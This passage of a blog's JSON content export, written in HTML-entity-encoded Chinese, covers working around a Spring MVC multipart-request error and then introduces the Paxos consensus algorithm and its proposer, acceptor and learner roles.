~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] ... &#x65B9;&#x6848;required&#x914D;&#x7F6E;&#x5931;&#x6548;&#xFF0C;&#x4F30;&#x8BA1;&#x662F;&#x6CA1;&#x6709;&#x8D70;required&#x7684;&#x76F8;&#x5173;&#x6D41;&#x7A0B;&#x3002;&#x6211;&#x4EEC;&#x6839;&#x636E;&#x6240;&#x62A5;&#x7684;&#x7B2C;&#x4E09;&#x884C;&#x9519;&#x8BEF;&#xFF0C;&#x8FDB;&#x5165;RequestPartMethodArgumentResolver.class&#x7684;&#x6E90;&#x7801;&#x7684;116&#x884C;&#x67E5;&#x770B;&#x3002;123456789101112131415161718111 @Override112 public Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer,113 NativeWebRequest request, WebDataBinderFactory binderFactory) throws Exception {114115 HttpServletRequest servletRequest = request.getNativeRequest(HttpServletRequest.class);116 assertIsMultipartRequest(servletRequest);117118 MultipartHttpServletRequest multipartRequest =119 WebUtils.getNativeRequest(servletRequest, MultipartHttpServletRequest.class);120121 String partName = getPartName(parameter);122 Object arg;123124 if (MultipartFile.class.equals(parameter.getParameterType())) {125 Assert.notNull(multipartRequest, &quot;Expected MultipartHttpServletRequest: is a MultipartResolver configured?&quot;);126 arg = multipartRequest.getFile(partName); } ..... &#x518D;&#x70B9;&#x51FB;116&#x884C;&#xFF0C;&#x8FDB;&#x5165;assertIsMultipartRequest&#x65B9;&#x6CD5;123456175 private static void assertIsMultipartRequest(HttpServletRequest request) {176 String contentType = request.getContentType();177 if (contentType == null || !contentType.toLowerCase().startsWith(&quot;multipart/&quot;)) {178 throw new MultipartException(&quot;The current request is not a multipart request&quot;);179 } } &#x5F88;&#x660E;&#x663E;&#xFF0C;&#x9519;&#x8BEF;&#x5C31;&#x662F;178&#x884C;&#x89E6;&#x53D1;&#x7684;&#x3002;&#x800C;&#x4E14;&#x5728;&#x4E0A;&#x5C42;&#x7684;&#x51E0;&#x4E2A;&#x8C03;&#x7528;&#x4E2D;&#x4E5F;&#x6CA1;&#x6709;&#x6D89;&#x53CA;&#x5230;required&#x7684;&#x6D41;&#x7A0B;&#x3002;&#x90A3;&#x4E48;&#x95EE;&#x9898;&#x6765;&#x4E86;, &#x63A5;&#x53E3;&#x5076;&#x5C14;&#x9700;&#x8981;&#x8D77;&#x5230;&#x4E0A;&#x4F20;&#x4F5C;&#x7528;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x6539;&#x53D8;&#x63A5;&#x53E3;&#x4F20;&#x53C2;&#x5F62;&#x5F0F;&#xFF0C;&#x5C31;&#x53EA;&#x80FD;&#x6539;&#x6E90;&#x7801;&#x4E86;&#xFF0C;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x4E0D;&#x662F;&#x597D;&#x7684;&#x65B9;&#x6848;&#x3002; &#x90A3;&#x7B54;&#x6848;&#x80AF;&#x5B9A;&#x5C31;&#x5728;&#x6E90;&#x7801;&#x91CC;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x5C31;&#x60F3;&#x5230;&#x53EF;&#x4EE5;&#x5728;&#x63A5;&#x53E3;&#x5904;&#x5B8C;&#x5168;&#x53BB;&#x6389;photoFile(MultipartFile)&#x53C2;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6A21;&#x4EFF;&#x6E90;&#x7801;&#xFF0C;&#x4ECE;request&#x91CC;&#x53BB;&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#x3002; &#x4E0B;&#x9762;&#x662F;&#x6839;&#x636E;&#x6E90;&#x7801;118-126&#x884C;&#x3001;176-179&#x884C;&#x4FEE;&#x6539;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x7ECF;&#x6D4B;&#x8BD5;&#x662F;&#x53EF;&#x884C;&#x7684;&#xFF1A;123456789101112131415@ResponseBody@RequestMapping(value = &quot;/upload&quot;)public String uploadPics(@RequestParam(value = &quot;type&quot;, required = true) String type, HttpServletRequest request) { .... // &#x68C0;&#x6D4B;&#x662F;&#x5426;&#x4E3A;&#x4E0A;&#x4F20;&#x8BF7;&#x6C42; String contentType = request.getContentType(); if (contentType != null &amp;&amp; contentType.toLowerCase().startsWith(&quot;multipart/&quot;)) { MultipartHttpServletRequest multipartRequest = WebUtils.getNativeRequest(request, MultipartHttpServletRequest.class); MultipartFile file = multipartRequest.getFile(&quot;file&quot;); .... } ....} &#x540E;&#x8BB0;&#x95EE;&#x9898;&#x7684;&#x5904;&#x7406;&#x5176;&#x5B9E;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x8FB9;&#x6587;&#x7AE0;&#x7684;&#x8BB0;&#x5F55;&#x662F;&#x4E3A;&#x4E86;&#x53E6;&#x4E00;&#x4EF6;&#x4E8B;&#x3002; &#x5F53;&#x65F6;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#x65F6;&#xFF0C;&#x53D1;&#x73B0;&#x5E38;&#x89C4;&#x5199;&#x6CD5;&#x8D70;&#x4E0D;&#x901A;&#xFF0C;&#x53C8;&#x4E0D;&#x597D;&#x6539;&#x6E90;&#x7801;&#xFF0C;&#x5185;&#x5FC3;&#x662F;&#x6709;&#x8349;&#x6CE5;&#x9A6C;&#x5954;&#x817E;&#x800C;&#x8FC7;&#x7684;&#x3002; &#x77E5;&#x9053;&#x7B54;&#x6848;&#x53EF;&#x80FD;&#x5728;&#x6E90;&#x7801;&#x91CC;&#xFF0C;&#x731C;&#x60F3;&#x53EF;&#x4EE5;&#x53BB;&#x7528;request&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x53C8;&#x89C9;&#x5F97;&#x9EBB;&#x70E6;&#xFF0C;&#x4E0D;&#x60F3;&#x53BB;&#x5E72;&#x8FD9;&#x4E8B;&#xFF0C;&#x60F3;&#x7740;&#x53EF;&#x80FD;&#x6709;&#x66F4;&#x597D;&#x7684;&#x529E;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x4E8B;&#x5C31;&#x62D6;&#x7740;&#x3002; &#x5230;&#x540E;&#x6765;&#x95EE;&#x540C;&#x4E8B;&#x600E;&#x4E48;&#x89E3;&#x51B3;&#xFF0C;&#x540C;&#x4E8B;&#x8BF4;&#x90A3;&#x5C31;&#x4ECE;request&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#x54AF;&#x3002;:-O &#x5176;&#x5B9E;&#x5DE5;&#x4F5C;&#x7ECF;&#x5E38;&#x78B0;&#x5230;&#x8FD9;&#x7C7B;&#x4E8B;&#x60C5;&#xFF0C;&#x4F46;&#x662F;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x90A3;&#x4E9B; &#x201C;&#x8C8C;&#x4F3C;&#x9065;&#x8FDC;&#x7684;&#x8DEF;&#x9014;&#x201D; &#x624D;&#x662F;&#x771F;&#x6B63;&#x7684;&#x6377;&#x5F84; ~","raw":null,"content":null,"categories":[{"name":"错误集锦","slug":"错误集锦","permalink":"http://www.wangxin123.com/categories/错误集锦/"}],"tags":[]},{"title":"Paxos算法","slug":"Paxos算法","date":"2016-11-07T14:41:19.000Z","updated":"2016-11-17T11:59:42.669Z","comments":true,"path":"2016/11/07/Paxos算法/","link":"","permalink":"http://www.wangxin123.com/2016/11/07/Paxos算法/","excerpt":"Paxos&#x7B97;&#x6CD5;&#x662F;&#x83B1;&#x65AF;&#x5229;&#xB7;&#x5170;&#x4F2F;&#x7279;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Leslie Lamport&#xFF0C;LaTeX&#x4E2D;&#x7684;&#x201C;La&#x201D;&#xFF09;&#x4E8E;1990&#x5E74;&#x63D0;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x4E14;&#x5177;&#x6709;&#x9AD8;&#x5EA6;&#x5BB9;&#x9519;&#x7279;&#x6027;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x3002; &#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x8282;&#x70B9;&#x901A;&#x4FE1;&#x5B58;&#x5728;&#x4E24;&#x79CD;&#x6A21;&#x578B;&#xFF1A;&#x5171;&#x4EAB;&#x5185;&#x5B58;&#xFF08;Shared memory&#xFF09;&#x548C;&#x6D88;&#x606F;&#x4F20;&#x9012;&#xFF08;Messages passing&#xFF09;&#x3002;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x901A;&#x4FE1;&#x6A21;&#x578B;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x4F1A;&#x53D1;&#x751F;&#x4EE5;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;&#x8FDB;&#x7A0B;&#x53EF;&#x80FD;&#x4F1A;&#x6162;&#x3001;&#x88AB;&#x6740;&#x6B7B;&#x6216;&#x8005;&#x91CD;&#x542F;&#xFF0C;&#x6D88;&#x606F;&#x53EF;&#x80FD;&#x4F1A;&#x5EF6;&#x8FDF;&#x3001;&#x4E22;&#x5931;&#x3001;&#x91CD;&#x590D;&#xFF0C;&#x5728;&#x57FA;&#x7840;Paxos&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x5148;&#x4E0D;&#x8003;&#x8651;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x6D88;&#x606F;&#x7BE1;&#x6539;&#x5373;&#x62DC;&#x5360;&#x5EAD;&#x9519;&#x8BEF;&#x7684;&#x60C5;&#x51B5;&#x3002;Paxos&#x7B97;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x53EF;&#x80FD;&#x53D1;&#x751F;&#x4E0A;&#x8FF0;&#x5F02;&#x5E38;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x5982;&#x4F55;&#x5C31;&#x67D0;&#x4E2A;&#x503C;&#x8FBE;&#x6210;&#x4E00;&#x81F4;&#xFF0C;&#x4FDD;&#x8BC1;&#x4E0D;&#x8BBA;&#x53D1;&#x751F;&#x4EE5;&#x4E0A;&#x4EFB;&#x4F55;&#x5F02;&#x5E38;&#xFF0C;&#x90FD;&#x4E0D;&#x4F1A;&#x7834;&#x574F;&#x51B3;&#x8BAE;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x573A;&#x666F;&#x662F;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x5404;&#x8282;&#x70B9;&#x7684;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x4E00;&#x81F4;&#xFF0C;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x90FD;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x64CD;&#x4F5C;&#x5E8F;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x4EEC;&#x6700;&#x540E;&#x80FD;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#x3002;&#x4E3A;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x547D;&#x4EE4;&#x5E8F;&#x5217;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6BCF;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x4E0A;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x201C;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x201D;&#x4EE5;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x770B;&#x5230;&#x7684;&#x6307;&#x4EE4;&#x4E00;&#x81F4;&#x3002;&#x4E00;&#x4E2A;&#x901A;&#x7528;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x53EF;&#x4EE5;&#x5E94;&#x7528;&#x5728;&#x8BB8;&#x591A;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x4E2D;&#x7684;&#x91CD;&#x8981;&#x95EE;&#x9898;&#x3002;&#x56E0;&#x6B64;&#x4ECE;20&#x4E16;&#x7EAA;80&#x5E74;&#x4EE3;&#x8D77;&#x5BF9;&#x4E8E;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x7684;&#x7814;&#x7A76;&#x5C31;&#x6CA1;&#x6709;&#x505C;&#x6B62;&#x8FC7;&#x3002;","keywords":null,"text":"Paxos&#x7B97;&#x6CD5;&#x662F;&#x83B1;&#x65AF;&#x5229;&#xB7;&#x5170;&#x4F2F;&#x7279;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Leslie Lamport&#xFF0C;LaTeX&#x4E2D;&#x7684;&#x201C;La&#x201D;&#xFF09;&#x4E8E;1990&#x5E74;&#x63D0;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x4E14;&#x5177;&#x6709;&#x9AD8;&#x5EA6;&#x5BB9;&#x9519;&#x7279;&#x6027;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x3002; &#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x8282;&#x70B9;&#x901A;&#x4FE1;&#x5B58;&#x5728;&#x4E24;&#x79CD;&#x6A21;&#x578B;&#xFF1A;&#x5171;&#x4EAB;&#x5185;&#x5B58;&#xFF08;Shared memory&#xFF09;&#x548C;&#x6D88;&#x606F;&#x4F20;&#x9012;&#xFF08;Messages passing&#xFF09;&#x3002;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x901A;&#x4FE1;&#x6A21;&#x578B;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x4F1A;&#x53D1;&#x751F;&#x4EE5;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;&#x8FDB;&#x7A0B;&#x53EF;&#x80FD;&#x4F1A;&#x6162;&#x3001;&#x88AB;&#x6740;&#x6B7B;&#x6216;&#x8005;&#x91CD;&#x542F;&#xFF0C;&#x6D88;&#x606F;&#x53EF;&#x80FD;&#x4F1A;&#x5EF6;&#x8FDF;&#x3001;&#x4E22;&#x5931;&#x3001;&#x91CD;&#x590D;&#xFF0C;&#x5728;&#x57FA;&#x7840;Paxos&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x5148;&#x4E0D;&#x8003;&#x8651;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x6D88;&#x606F;&#x7BE1;&#x6539;&#x5373;&#x62DC;&#x5360;&#x5EAD;&#x9519;&#x8BEF;&#x7684;&#x60C5;&#x51B5;&#x3002;Paxos&#x7B97;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x53EF;&#x80FD;&#x53D1;&#x751F;&#x4E0A;&#x8FF0;&#x5F02;&#x5E38;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x5982;&#x4F55;&#x5C31;&#x67D0;&#x4E2A;&#x503C;&#x8FBE;&#x6210;&#x4E00;&#x81F4;&#xFF0C;&#x4FDD;&#x8BC1;&#x4E0D;&#x8BBA;&#x53D1;&#x751F;&#x4EE5;&#x4E0A;&#x4EFB;&#x4F55;&#x5F02;&#x5E38;&#xFF0C;&#x90FD;&#x4E0D;&#x4F1A;&#x7834;&#x574F;&#x51B3;&#x8BAE;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x573A;&#x666F;&#x662F;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x5404;&#x8282;&#x70B9;&#x7684;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x4E00;&#x81F4;&#xFF0C;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x90FD;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x64CD;&#x4F5C;&#x5E8F;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x4EEC;&#x6700;&#x540E;&#x80FD;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#x3002;&#x4E3A;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x547D;&#x4EE4;&#x5E8F;&#x5217;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6BCF;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x4E0A;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x201C;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x201D;&#x4EE5;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x770B;&#x5230;&#x7684;&#x6307;&#x4EE4;&#x4E00;&#x81F4;&#x3002;&#x4E00;&#x4E2A;&#x901A;&#x7528;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x53EF;&#x4EE5;&#x5E94;&#x7528;&#x5728;&#x8BB8;&#x591A;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x4E2D;&#x7684;&#x91CD;&#x8981;&#x95EE;&#x9898;&#x3002;&#x56E0;&#x6B64;&#x4ECE;20&#x4E16;&#x7EAA;80&#x5E74;&#x4EE3;&#x8D77;&#x5BF9;&#x4E8E;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x7684;&#x7814;&#x7A76;&#x5C31;&#x6CA1;&#x6709;&#x505C;&#x6B62;&#x8FC7;&#x3002; &#x4E3A;&#x63CF;&#x8FF0;Paxos&#x7B97;&#x6CD5;&#xFF0C;Lamport&#x865A;&#x62DF;&#x4E86;&#x4E00;&#x4E2A;&#x53EB;&#x505A;Paxos&#x7684;&#x5E0C;&#x814A;&#x57CE;&#x90A6;&#xFF0C;&#x8FD9;&#x4E2A;&#x5C9B;&#x6309;&#x7167;&#x8BAE;&#x4F1A;&#x6C11;&#x4E3B;&#x5236;&#x7684;&#x653F;&#x6CBB;&#x6A21;&#x5F0F;&#x5236;&#x8BA2;&#x6CD5;&#x5F8B;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x4EBA;&#x613F;&#x610F;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x548C;&#x7CBE;&#x529B;&#x653E;&#x5728;&#x8FD9;&#x79CD;&#x4E8B;&#x60C5;&#x4E0A;&#x3002;&#x6240;&#x4EE5;&#x65E0;&#x8BBA;&#x662F;&#x8BAE;&#x5458;&#xFF0C;&#x8BAE;&#x957F;&#x6216;&#x8005;&#x4F20;&#x9012;&#x7EB8;&#x6761;&#x7684;&#x670D;&#x52A1;&#x5458;&#x90FD;&#x4E0D;&#x80FD;&#x627F;&#x8BFA;&#x522B;&#x4EBA;&#x9700;&#x8981;&#x65F6;&#x4E00;&#x5B9A;&#x4F1A;&#x51FA;&#x73B0;&#xFF0C;&#x4E5F;&#x65E0;&#x6CD5;&#x627F;&#x8BFA;&#x6279;&#x51C6;&#x51B3;&#x8BAE;&#x6216;&#x8005;&#x4F20;&#x9012;&#x6D88;&#x606F;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x5047;&#x8BBE;&#x6CA1;&#x6709;&#x62DC;&#x5360;&#x5EAD;&#x5C06;&#x519B;&#x95EE;&#x9898;&#xFF08;Byzantine failure&#xFF0C;&#x5373;&#x867D;&#x7136;&#x6709;&#x53EF;&#x80FD;&#x4E00;&#x4E2A;&#x6D88;&#x606F;&#x88AB;&#x4F20;&#x9012;&#x4E86;&#x4E24;&#x6B21;&#xFF0C;&#x4F46;&#x662F;&#x7EDD;&#x5BF9;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#x7684;&#x6D88;&#x606F;&#xFF09;&#xFF1B;&#x53EA;&#x8981;&#x7B49;&#x5F85;&#x8DB3;&#x591F;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6D88;&#x606F;&#x5C31;&#x4F1A;&#x88AB;&#x4F20;&#x5230;&#x3002;&#x53E6;&#x5916;&#xFF0C;Paxos&#x5C9B;&#x4E0A;&#x7684;&#x8BAE;&#x5458;&#x662F;&#x4E0D;&#x4F1A;&#x53CD;&#x5BF9;&#x5176;&#x4ED6;&#x8BAE;&#x5458;&#x63D0;&#x51FA;&#x7684;&#x51B3;&#x8BAE;&#x7684;&#x3002; &#x5BF9;&#x5E94;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x8BAE;&#x5458;&#x5BF9;&#x5E94;&#x4E8E;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x5236;&#x5B9A;&#x7684;&#x6CD5;&#x5F8B;&#x5BF9;&#x5E94;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;&#x3002;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#x9700;&#x8981;&#x8FDB;&#x5165;&#x4E00;&#x4E2A;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x4F8B;&#x5982;&#x5728;&#x72EC;&#x7ACB;Cache&#x7684;&#x5BF9;&#x79F0;&#x591A;&#x5904;&#x7406;&#x5668;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5404;&#x4E2A;&#x5904;&#x7406;&#x5668;&#x8BFB;&#x5185;&#x5B58;&#x7684;&#x67D0;&#x4E2A;&#x5B57;&#x8282;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x8BFB;&#x5230;&#x540C;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x5426;&#x5219;&#x7CFB;&#x7EDF;&#x5C31;&#x8FDD;&#x80CC;&#x4E86;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x8981;&#x6C42;&#x3002;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#x5BF9;&#x5E94;&#x4E8E;&#x6CD5;&#x5F8B;&#x6761;&#x6587;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#x3002;&#x8BAE;&#x5458;&#x548C;&#x670D;&#x52A1;&#x5458;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#x5BF9;&#x5E94;&#x4E8E;&#x8282;&#x70B9;&#x548C;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x901A;&#x9053;&#x7684;&#x4E0D;&#x53EF;&#x9760;&#x6027;&#x3002; &#x7B97;&#x6CD5;&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;&#x9996;&#x5148;&#x5C06;&#x8BAE;&#x5458;&#x7684;&#x89D2;&#x8272;&#x5206;&#x4E3A;proposers&#xFF0C;acceptors&#xFF0C;&#x548C;learners&#xFF08;&#x5141;&#x8BB8;&#x8EAB;&#x517C;&#x6570;&#x804C;&#xFF09;&#x3002;proposers&#x63D0;&#x51FA;&#x63D0;&#x6848;&#xFF0C;&#x63D0;&#x6848;&#x4FE1;&#x606F;&#x5305;&#x62EC;&#x63D0;&#x6848;&#x7F16;&#x53F7;&#x548C;&#x63D0;&#x8BAE;&#x7684;value&#xFF1B;acceptor&#x6536;&#x5230;&#x63D0;&#x6848;&#x540E;&#x53EF;&#x4EE5;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x63D0;&#x6848;&#xFF0C;&#x82E5;&#x63D0;&#x6848;&#x83B7;&#x5F97;&#x591A;&#x6570;acceptors&#x7684;&#x63A5;&#x53D7;&#xFF0C;&#x5219;&#x79F0;&#x8BE5;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF1B;learners&#x53EA;&#x80FD;&#x201C;&#x5B66;&#x4E60;&#x201D;&#x88AB;&#x6279;&#x51C6;&#x7684;&#x63D0;&#x6848;&#x3002;&#x5212;&#x5206;&#x89D2;&#x8272;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x66F4;&#x7CBE;&#x786E;&#x7684;&#x5B9A;&#x4E49;&#x95EE;&#x9898;&#xFF1A; &#x51B3;&#x8BAE;&#xFF08;value&#xFF09;&#x53EA;&#x6709;&#x5728;&#x88AB;proposers&#x63D0;&#x51FA;&#x540E;&#x624D;&#x80FD;&#x88AB;&#x6279;&#x51C6;&#xFF08;&#x672A;&#x7ECF;&#x6279;&#x51C6;&#x7684;&#x51B3;&#x8BAE;&#x79F0;&#x4E3A;&#x201C;&#x63D0;&#x6848;&#xFF08;proposal&#xFF09;&#x201D;&#xFF09;&#xFF1B; &#x5728;&#x4E00;&#x6B21;Paxos&#x7B97;&#x6CD5;&#x7684;&#x6267;&#x884C;&#x5B9E;&#x4F8B;&#x4E2D;&#xFF0C;&#x53EA;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x4E00;&#x4E2A;value&#xFF1B; learners&#x53EA;&#x80FD;&#x83B7;&#x5F97;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x7684;value&#x3002; &#x53E6;&#x5916;&#x8FD8;&#x9700;&#x8981;&#x4FDD;&#x8BC1;progress&#x3002;&#x8FD9;&#x4E00;&#x70B9;&#x4EE5;&#x540E;&#x518D;&#x8BA8;&#x8BBA;&#x3002; &#x4F5C;&#x8005;&#x901A;&#x8FC7;&#x4E0D;&#x65AD;&#x52A0;&#x5F3A;&#x4E0A;&#x8FF0;3&#x4E2A;&#x7EA6;&#x675F;&#xFF08;&#x4E3B;&#x8981;&#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#xFF09;&#x83B7;&#x5F97;&#x4E86;Paxos&#x7B97;&#x6CD5;&#x3002; &#x6279;&#x51C6;value&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9996;&#x5148;proposers&#x5C06;value&#x53D1;&#x9001;&#x7ED9;acceptors&#xFF0C;&#x4E4B;&#x540E;acceptors&#x5BF9;value&#x8FDB;&#x884C;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x3002;&#x4E3A;&#x4E86;&#x6EE1;&#x8DB3;&#x53EA;&#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x7684;&#x7EA6;&#x675F;&#xFF0C;&#x8981;&#x6C42;&#x7ECF;&#x201C;&#x591A;&#x6570;&#x6D3E;&#xFF08;majority&#xFF09;&#x201D;&#x63A5;&#x53D7;&#x7684;value&#x6210;&#x4E3A;&#x6B63;&#x5F0F;&#x7684;&#x51B3;&#x8BAE;&#xFF08;&#x79F0;&#x4E3A;&#x201C;&#x6279;&#x51C6;&#x201D;&#x51B3;&#x8BAE;&#xFF09;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x65E0;&#x8BBA;&#x662F;&#x6309;&#x7167;&#x4EBA;&#x6570;&#x8FD8;&#x662F;&#x6309;&#x7167;&#x6743;&#x91CD;&#x5212;&#x5206;&#xFF0C;&#x4E24;&#x7EC4;&#x201C;&#x591A;&#x6570;&#x6D3E;&#x201D;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x5982;&#x679C;&#x6BCF;&#x4E2A;acceptor&#x53EA;&#x80FD;&#x63A5;&#x53D7;&#x4E00;&#x4E2A;value&#xFF0C;&#x7EA6;&#x675F;2&#x5C31;&#x80FD;&#x4FDD;&#x8BC1;&#x3002; 